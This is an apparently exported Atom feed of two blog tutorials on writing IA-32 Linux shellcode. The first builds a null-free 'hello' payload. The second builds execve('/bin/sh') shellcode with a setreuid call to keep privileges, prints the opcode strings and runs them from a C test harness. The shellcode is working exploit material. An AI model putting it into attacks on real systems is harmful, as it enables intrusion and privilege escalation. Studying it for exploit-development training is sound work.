<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Exploit | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/exploit/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-12-15T09:29:03+01:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[IA-32 Linux Shellcode Basics 2]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/26/ia-32-linux-shellcode-basics-2/"/>
    <updated>2015-06-26T11:08:30+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/26/ia-32-linux-shellcode-basics-2</id>
    <content type="html"><![CDATA[<p>Starting with the ASM code that is position dependent:
{% codeblock lang:asm shell1.asm %}
section .data
cmd db &lsquo;/bin/sh&rsquo;,0x0</p>

<p>section .text
global <em>start
</em>start:</p>

<p>;execve(&ldquo;/bin/sh&rdquo;, {&ldquo;/bin/sh&rdquo;, NULL}, NULL)
mov eax, 11
lea ebx, [cmd]
mov ecx, 0
push ecx
push ebx
mov ecx, esp
mov edx, 0
int 0x80
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# nasm -f elf shell1.asm; ld shell1.o -o shell1</p>

<p>root@kali32:/tmp# ./shell1</p>

<h1></h1>

<p>{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# objdump -M intel -d shell1</p>

<p>shell1:     file format elf32-i386</p>

<p>Disassembly of section .text:</p>

<p>08048080 <_start>:
 8048080:   b8 0b 00 00 00          mov    eax,0xb
 8048085:   8d 1d 9c 90 04 08       lea    ebx,ds:0x804909c
 804808b:   b9 00 00 00 00          mov    ecx,0x0
 8048090:   51                      push   ecx
 8048091:   53                      push   ebx
 8048092:   89 e1                   mov    ecx,esp
 8048094:   ba 00 00 00 00          mov    edx,0x0
 8048099:   cd 80                   int    0x80
{% endcodeblock %}</p>

<p>The minimalistic shell could look like <code>execve("/bin/sh", NULL, NULL)</code>.
However, according documentation it&rsquo;s not portable among UNIX systems:</p>

<p>{% codeblock %}
man 2 execve</p>

<p>  On Linux, argv can be specified as NULL, which has the same effect as
  specifying this argument as a pointer to a list containing a single NULL
  pointer.  Do not take advantage of this  misfea‚Äê ture!  It is nonstandard and
  nonportable: on most other UNIX systems doing this will result in an error
  (EFAULT).
{% endcodeblock %}</p>

<p>Again, the same procedure. We need to get rid of absolute address reference and
NULL bytes.</p>

<p>{% codeblock lang:asm shell2.asm %}
section .text
global <em>start
</em>start:</p>

<p>;execve(&ldquo;/bin/sh&rdquo;, {&ldquo;/bin/sh&rdquo;, NULL}, NULL)
xor eax, eax
xor edx, edx</p>

<p>push eax ; \0
push &lsquo;n/sh&rsquo;
push &lsquo;//bi&rsquo;
mov ebx, esp</p>

<p>push eax ; \0
push ebx ; /bin/sh
mov ecx, esp</p>

<p>mov  al, 11
int 0x80
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# nasm -f elf shell2.asm; ld shell2.o -o shell2</p>

<p>root@kali32:/tmp# ./shell2</p>

<h1></h1>

<p>{% endcodeblock %}</p>

<p>Before we dump our opcodes, we add <code>setreuid(geteuid(), geteuid()</code> call:</p>

<p>{% codeblock lang:asm shell3.asm %}
section .text
global <em>start
</em>start:</p>

<p>; geteuid
push byte 49
pop eax
int 0x80</p>

<p>; setreuid(geteuid(), geteuid()
mov ebx, eax
mov ecx, eax
push byte 70
pop eax
int 0x80</p>

<p>;execve(&ldquo;/bin/sh&rdquo;, {&ldquo;/bin/sh&rdquo;, NULL}, NULL)
xor eax, eax
xor edx, edx</p>

<p>push eax ; \0
push &lsquo;n/sh&rsquo;
push &lsquo;//bi&rsquo;
mov ebx, esp</p>

<p>push eax ; \0
push ebx ; /bin/sh
mov ecx, esp</p>

<p>mov  al, 11
int 0x80
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# nasm -f elf shell3.asm; ld shell3.o -o shell3</p>

<p>root@kali32:/tmp# ./shell3
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# objdump -M intel -d shell3</p>

<p>shell3:     file format elf32-i386</p>

<p>Disassembly of section .text:</p>

<p>08048060 <_start>:
 8048060:   6a 31                   push   0x31
 8048062:   58                      pop    eax
 8048063:   cd 80                   int    0x80
 8048065:   89 c3                   mov    ebx,eax
 8048067:   89 c1                   mov    ecx,eax
 8048069:   6a 46                   push   0x46
 804806b:   58                      pop    eax
 804806c:   cd 80                   int    0x80
 804806e:   31 c0                   xor    eax,eax
 8048070:   31 d2                   xor    edx,edx
 8048072:   50                      push   eax
 8048073:   68 6e 2f 73 68          push   0x68732f6e
 8048078:   68 2f 2f 62 69          push   0x69622f2f
 804807d:   89 e3                   mov    ebx,esp
 804807f:   50                      push   eax
 8048080:   53                      push   ebx
 8048081:   89 e1                   mov    ecx,esp
 8048083:   b0 0b                   mov    al,0xb
 8048085:   cd 80                   int    0x80
{% endcodeblock %}</p>

<p>Analogously as before:
{% codeblock %}
root@kali32:/tmp# objdump -d shell3 | tr &lsquo;[:blank:]&rsquo; &lsquo;\n&rsquo; | egrep &lsquo;^[0-9a-f]{2}$&rsquo; | sed &rsquo;s#^#\x#&lsquo; | paste -s -d &rsquo;&lsquo;
\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# sc=$(objdump -d shell3 | tr &lsquo;[:blank:]&rsquo; &lsquo;\n&rsquo; | egrep &lsquo;^[0-9a-f]{2}$&rsquo; | sed &rsquo;s#^#\x#&lsquo; | paste -s -d &rsquo;&lsquo;)</p>

<p>root@kali32:/tmp# echo $sc | ruby -e &lsquo;print $stdin.read.scan(/\x(..)/).flatten.map{ |x| x.to_i(16).chr }.join&rsquo; > shellcode
{% endcodeblock %}</p>

<p>{% codeblock %}</p>

<h1>include &lt;sys/mman.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;stdio.h></h1>

<p>char sc[]= &ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;;</p>

<p>int main(){
        void * a = mmap(0, 4096, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
        printf(&ldquo;allocated executable memory at: %p\n&rdquo;, a);
        printf(&ldquo;shellcode length: %d\n&rdquo;, strlen(sc));
        ((void (*)(void)) memcpy(a, sc, sizeof(sc)))();
}
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# gcc test.c -o test
root@kali32:/tmp# ./test
allocated executable memory at: 0xb76f7000
shellcode length: 39</p>

<h1></h1>

<p>{% endcodeblock %}</p>

<p>Alternatively we can obtain string reference with <code>call</code> instruction:</p>

<p>{% codeblock lang:asm shell4.asm %}
section .text
global <em>start
</em>start:</p>

<p>; geteuid
push byte 49
pop eax
int 0x80</p>

<p>; setreuid(geteuid(), geteuid()
mov ebx, eax
mov ecx, eax
push byte 70
pop eax
int 0x80</p>

<p>;execve(&ldquo;/bin/sh&rdquo;, NULL, NULL);
xor eax, eax
xor ecx, ecx
xor edx, edx</p>

<p>jmp short string_loc</p>

<p>string_loc_ret:
pop ebx
mov [ebx+7], cl ; rewrite N with \0</p>

<p>push edx; \0
push ebx; /bin/sh
mov esp, ecx</p>

<p>mov al, 11
int 0x80</p>

<p>string_loc:
call string_loc_ret ; this put the (return) address of the string to the top of the stack
db &lsquo;/bin/shN&rsquo;
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# nasm -f elf shell4.asm; ld shell4.o -o shell4</p>

<p>root@kali32:/tmp# ./shell4
Segmentation fault
{% endcodeblock %}</p>

<p>The segfault is normal and it&rsquo;s because we are trying to overwrite the code
segment at the line <code>mov BYTE PTR [ebx+0x7],cl</code>. However, our shellcode will be
loaded on stack and that doesn&rsquo;t mean any complication.</p>

<p>{% codeblock %}
root@kali32:/tmp# objdump -M intel -d shell4</p>

<p>shell4:     file format elf32-i386</p>

<p>Disassembly of section .text:</p>

<p>08048060 <_start>:
 8048060:   6a 31                   push   0x31
 8048062:   58                      pop    eax
 8048063:   cd 80                   int    0x80
 8048065:   89 c3                   mov    ebx,eax
 8048067:   89 c1                   mov    ecx,eax
 8048069:   6a 46                   push   0x46
 804806b:   58                      pop    eax
 804806c:   cd 80                   int    0x80
 804806e:   31 c0                   xor    eax,eax
 8048070:   31 c9                   xor    ecx,ecx
 8048072:   31 d2                   xor    edx,edx
 8048074:   eb 0c                   jmp    8048082 <string_loc></p>

<p>08048076 <string_loc_ret>:
 8048076:   5b                      pop    ebx
 8048077:   88 4b 07                mov    BYTE PTR [ebx+0x7],cl
 804807a:   52                      push   edx
 804807b:   53                      push   ebx
 804807c:   89 cc                   mov    esp,ecx
 804807e:   b0 0b                   mov    al,0xb
 8048080:   cd 80                   int    0x80</p>

<p>08048082 <string_loc>:
 8048082:   e8 ef ff ff ff          call   8048076 <string_loc_ret>
 8048087:   2f                      das  <br/>
 8048088:   62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
 804808b:   2f                      das  <br/>
 804808c:   73 68                   jae    80480f6 &lt;string_loc+0x74>
 804808e:   4e                      dec    esi
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# objdump -d shell4 | tr &lsquo;[:blank:]&rsquo; &lsquo;\n&rsquo; | egrep &lsquo;^[0-9a-f]{2}$&rsquo; | sed &rsquo;s#^#\x#&lsquo; | paste -s -d &rsquo;&lsquo;
\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xc9\x31\xd2\xeb\x0c\x5b\x88\x4b\x07\x52\x53\x89\xcc\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e
{% endcodeblock %}</p>

<p>{% codeblock lang:c test.c %}</p>

<h1>include &lt;sys/mman.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;stdio.h></h1>

<p>char sc[]= &ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xc9\x31\xd2\xeb\x0c\x5b\x88\x4b\x07\x52\x53\x89\xcc\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e&rdquo;;</p>

<p>int main(){
        void * a = mmap(0, 4096, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
        printf(&ldquo;allocated executable memory at: %p\n&rdquo;, a);
        printf(&ldquo;shellcode length: %d\n&rdquo;, strlen(sc));
        ((void (*)(void)) memcpy(a, sc, sizeof(sc)))();
}
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# ./test
allocated executable memory at: 0xb7789000
shellcode length: 47</p>

<h1></h1>

<p>{% endcodeblock %}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[IA-32 Linux Shellcode Basics 1]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/23/ia-32-linux-shellcode-basics-1/"/>
    <updated>2015-06-23T15:01:28+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/23/ia-32-linux-shellcode-basics-1</id>
    <content type="html"><![CDATA[<p>We start with the simple shellcode, that prints <code>hello</code> string. For this
purpose, we use Kali Linux 32 bit distribution, that could be downloaded
<a href="https://www.kali.org/downloads/">here</a>.</p>

<p>Because we want to have code as simple as possible, we use tcc ansi compiler and
nasm assembler.</p>

<p>{% codeblock %}
root@kali32:~# aptitude install tcc nasm
{% endcodeblock %}</p>

<p>{% codeblock lang:c hello.c %}</p>

<h1>include &lt;stdio.h></h1>

<p>void main() {
    printf(&ldquo;hello\n&rdquo;);
}
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# tcc -g hello.c -o hello</p>

<p>root@kali32:/tmp# echo &lsquo;set disassembly-flavor intel&rsquo; >> ~/.gdbinit</p>

<p>root@kali32:/tmp# gdb -q ./hello -ex &lsquo;disassemble main&rsquo; &ndash;batch
BFD: /tmp/hello: no group info for section .text.<strong>i686.get_pc_thunk.bx
BFD: /tmp/hello: no group info for section .text.</strong>i686.get_pc_thunk.bx
Dump of assembler code for function main:
   0x080481e4 &lt;+0>: push   ebp
   0x080481e5 &lt;+1>: mov    ebp,esp
   0x080481e7 &lt;+3>: sub    esp,0x0
   0x080481ed &lt;+9>: mov    eax,0x8049304
   0x080481f2 &lt;+14>:    push   eax
   0x080481f3 &lt;+15>:    call   0x80482e0 <printf>
   0x080481f8 &lt;+20>:    add    esp,0x4
   0x080481fb &lt;+23>:    leave<br/>
   0x080481fc &lt;+24>:    ret  <br/>
End of assembler dump.
{% endcodeblock %}</p>

<p>As we can see, the string is located at <code>0x08049304</code> address. However, our code
should be Position Independent (PIE) and without NULL characters.</p>

<p>To rewrite the code about, we need to:</p>

<ul>
<li>Look up the number corresponding to the system call in <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code></li>
<li>Place system call number in eax, and arguments in ebx, ecx, edx&hellip; in the order they appear in the corresponding man page</li>
<li>Execute <code>int 0x80</code> to alert the kernel we want to perform a system call</li>
</ul>


<p>Our first try:
{% codeblock lang:asm hello1.asm %}
section .data
msg db &lsquo;hello&rsquo;,0xa</p>

<p>section .text
global <em>start
</em>start:</p>

<p>;write(int fd, char *msg, unsigned int len)
mov eax, 4
mov ebx, 1
mov ecx, msg
mov edx, 6
int 0x80</p>

<p>;exit(int ret)
mov eax,1
mov ebx,0
int 0x80</p>

<p>{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# nasm -f elf hello1.asm; ld hello1.o -o hello1</p>

<p>root@kali32:/tmp# ./hello1
hello
{% endcodeblock %}</p>

<p>Dumping instruction bytecode:
{% codeblock %}
root@kali32:/tmp# objdump -d hello1 -M intel</p>

<p>hello1:     file format elf32-i386</p>

<p>Disassembly of section .text:</p>

<p>08048080 <_start>:
 8048080:   b8 04 00 00 00          mov    eax,0x4
 8048085:   bb 01 00 00 00          mov    ebx,0x1
 804808a:   b9 a4 90 04 08          mov    ecx,0x80490a4
 804808f:   ba 06 00 00 00          mov    edx,0x6
 8048094:   cd 80                   int    0x80
 8048096:   b8 01 00 00 00          mov    eax,0x1
 804809b:   bb 00 00 00 00          mov    ebx,0x0
 80480a0:   cd 80                   int    0x80
{% endcodeblock %}</p>

<p>When we set 32b register with a small value, the compiler fills the unused
space with zeros.  Instead, we should use AX = 16b or AL = 8b register parts
(in the case of register EAX).</p>

<p>Next try:</p>

<p>{% codeblock lang:asm hello2.asm %}
section .data
msg db &lsquo;hello&rsquo;,0xa</p>

<p>section .text
global <em>start
</em>start:</p>

<p>;write(int fd, char *msg, unsigned int len)
mov al, 4
mov bl, 1
mov ecx, msg
mov dl, 6
int 0x80</p>

<p>;exit(int ret)
mov al,1
mov bl,0
int 0x80
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# nasm -f elf hello2.asm; ld hello2.o -o hello2</p>

<p>root@kali32:/tmp# ./hello2
hello</p>

<p>root@kali32:/tmp# objdump -d hello2 -M intel</p>

<p>hello2:     file format elf32-i386</p>

<p>Disassembly of section .text:</p>

<p>08048080 <_start>:
 8048080:   b0 04                   mov    al,0x4
 8048082:   b3 01                   mov    bl,0x1
 8048084:   b9 94 90 04 08          mov    ecx,0x8049094
 8048089:   b2 06                   mov    dl,0x6
 804808b:   cd 80                   int    0x80
 804808d:   b0 01                   mov    al,0x1
 804808f:   b3 00                   mov    bl,0x0
 8048091:   cd 80                   int    0x80
{% endcodeblock %}</p>

<p>We attempt to make the code position independent pushing string to the stack:</p>

<p>{% codeblock lang:asm hello3.asm %}
section .text
global <em>start
</em>start:</p>

<p>;clear out the registers we are going to need
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx</p>

<p>;write(int fd, char *msg, unsigned int len)
mov al, 4
mov bl, 1
push 0x58580a6f ; push X, X, \n, o
push 0x6c6c6568 ; push l, l, e, h
mov ecx, esp
mov dl, 6
int 0x80</p>

<p>;exit(int ret)
mov al,1
xor ebx, ebx
int 0x80
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# nasm -f elf hello3.asm; ld hello3.o -o hello3</p>

<p>root@kali32:/tmp# ./hello3
hello</p>

<p>root@kali32:/tmp# objdump -d hello3 -M intel</p>

<p>hello3:     file format elf32-i386</p>

<p>Disassembly of section .text:</p>

<p>08048060 <_start>:
 8048060:   31 c0                   xor    eax,eax
 8048062:   31 db                   xor    ebx,ebx
 8048064:   31 c9                   xor    ecx,ecx
 8048066:   31 d2                   xor    edx,edx
 8048068:   b0 04                   mov    al,0x4
 804806a:   b3 01                   mov    bl,0x1
 804806c:   68 6f 0a 58 58          push   0x58580a6f
 8048071:   68 68 65 6c 6c          push   0x6c6c6568
 8048076:   89 e1                   mov    ecx,esp
 8048078:   b2 06                   mov    dl,0x6
 804807a:   cd 80                   int    0x80
 804807c:   b0 01                   mov    al,0x1
 804807e:   31 db                   xor    ebx,ebx
 8048080:   cd 80                   int    0x80
{% endcodeblock %}</p>

<p>Now it looks good, but the 0x0a could sometimes terminate the buffer
prematurely, so we simply do not use this character.</p>

<p>{% codeblock lang:asm shell4.asm %}
section .text
global <em>start
</em>start:</p>

<p>;clear out the registers we are going to need
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx</p>

<p>;write(int fd, char *msg, unsigned int len)
mov al, 4
mov bl, 1
push 0x5858586f ; push X, X, X, o
push 0x6c6c6568 ; push l, l, e, h
mov ecx, esp
mov dl, 5
int 0x80</p>

<p>;exit(int ret)
mov al,1
xor ebx, ebx
int 0x80
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# nasm -f elf hello4.asm; ld hello4.o -o hello4
root@kali32:/tmp# ./hello4
hello</p>

<p>root@kali32:/tmp# objdump -d hello4 -M intel</p>

<p>hello4:     file format elf32-i386</p>

<p>Disassembly of section .text:</p>

<p>08048060 <_start>:
 8048060:   31 c0                   xor    eax,eax
 8048062:   31 db                   xor    ebx,ebx
 8048064:   31 c9                   xor    ecx,ecx
 8048066:   31 d2                   xor    edx,edx
 8048068:   b0 04                   mov    al,0x4
 804806a:   b3 01                   mov    bl,0x1
 804806c:   68 6f 58 58 58          push   0x5858586f
 8048071:   68 68 65 6c 6c          push   0x6c6c6568
 8048076:   89 e1                   mov    ecx,esp
 8048078:   b2 05                   mov    dl,0x5
 804807a:   cd 80                   int    0x80
 804807c:   b0 01                   mov    al,0x1
 804807e:   31 db                   xor    ebx,ebx
 8048080:   cd 80                   int    0x80
{% endcodeblock %}</p>

<p>Now we parse out the opcodes and validate the functionality.</p>

<p>{% codeblock %}
root@kali32:/tmp# objdump -d hello4 | tr &lsquo;[:blank:]&rsquo; &lsquo;\n&rsquo; | egrep &lsquo;^[0-9a-f]{2}$&rsquo; | sed &rsquo;s#^#\x#&lsquo; | paste -s -d &rsquo;&lsquo;
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x6f\x58\x58\x58\x68\x68\x65\x6c\x6c\x89\xe1\xb2\x05\xcd\x80\xb0\x01\x31\xdb\xcd\x80
{% endcodeblock %}</p>

<p>If we want to store shellcode to the file:
{% codeblock %}
root@kali32:/tmp# sc=$(objdump -d hello4 | tr &lsquo;[:blank:]&rsquo; &lsquo;\n&rsquo; | egrep &lsquo;^[0-9a-f]{2}$&rsquo; | sed &rsquo;s#^#\x#&lsquo; | paste -s -d &rsquo;&lsquo;)</p>

<p>root@kali32:/tmp# echo $sc | ruby -e &lsquo;print $stdin.read.scan(/\x(..)/).flatten.map{ |x| x.to_i(16).chr }.join&rsquo; > hello.shellcode</p>

<p>root@kali32:/tmp# hexdump -C hello.shellcode
00000000  31 c0 31 db 31 c9 31 d2  b0 04 b3 01 68 6f 58 58  |1.1.1.1&hellip;..hoXX|
00000010  58 68 68 65 6c 6c 89 e1  b2 05 cd 80 b0 01 31 db  |Xhhell&hellip;&hellip;..1.|
00000020  cd 80                                             |..|
00000022
{% endcodeblock %}</p>

<p>{% codeblock lang:c test.c %}</p>

<h1>include &lt;sys/mman.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;stdio.h></h1>

<p>char sc[]= &ldquo;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x6f\x58\x58\x58\x68\x68\x65\x6c\x6c\x89\xe1\xb2\x05\xcd\x80\xb0\x01\x31\xdb\xcd\x80&rdquo;;</p>

<p>int main(){
        void * a = mmap(0, 4096, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
        printf(&ldquo;allocated executable memory at: %p\n&rdquo;, a);
        ((void (*)(void)) memcpy(a, sc, sizeof(sc)))();
}
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/tmp# gcc test.c -o test</p>

<p>root@kali32:/tmp# ./test
allocated executable memory at: 0xb7734000
hello
{% endcodeblock %}</p>

<p>Our next step will be to execute shell.</p>
]]></content>
  </entry>
  
</feed>
